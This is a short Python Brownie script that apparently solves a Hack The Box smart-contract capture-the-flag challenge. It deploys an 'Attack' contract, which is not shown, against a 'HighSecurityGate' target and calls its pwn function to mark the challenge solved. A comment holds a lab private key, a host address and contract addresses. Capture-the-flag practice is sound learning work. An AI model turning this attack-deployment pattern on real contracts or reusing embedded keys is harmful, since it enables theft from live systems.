#!/usr/bin/python3
from brownie import HighSecurityGate, Setup, Attack
from scripts.helpful_scripts import get_account
from colorama import Fore

"""
brownie networks add Ethereum HTB host=http://188.166.152.84:31577 chainid=1337

Private key     :  0xbe4598cb2163f33e257f7fd8a83a88f0032c49c2ffe164c52d7a222b28467d35
Address         :  0x97a4da7E4423e210E139E624b4A8cC4D29AD49Ec
Target contract :  0x0eF119bE876D5e90Ea024c7b7cEF02F50c40d376
Setup contract  :  0xE0d541e9c2cb23157cb6438472CC7E4544383112
"""

# * colours
green = Fore.GREEN
red = Fore.RED
blue = Fore.BLUE
magenta = Fore.MAGENTA
reset = Fore.RESET


def hack(attacker=None):
    target = HighSecurityGate.at("0x0eF119bE876D5e90Ea024c7b7cEF02F50c40d376")
    setup = Setup.at("0xE0d541e9c2cb23157cb6438472CC7E4544383112")

    # print(f"{blue}Last entrant: {green}{target.lastEntrant()}{reset}")

    attaking_contract = Attack.deploy(target.address, {"from": attacker})

    print(
        f"{green}Attack contract deployed at: {blue}{attaking_contract.address}{reset}"
    )

    # calling the pwn fn.
    tx = attaking_contract.pwn({"from": attacker})
    tx.wait(1)

    print(f"{blue}Last entrant: {green}{target.lastEntrant()}{reset}")
    print(f"{blue}Challenge solved: {green}{setup.isSolved()}{reset}")


def main():
    hack(get_account())


if __name__ == "__main__":
    main()
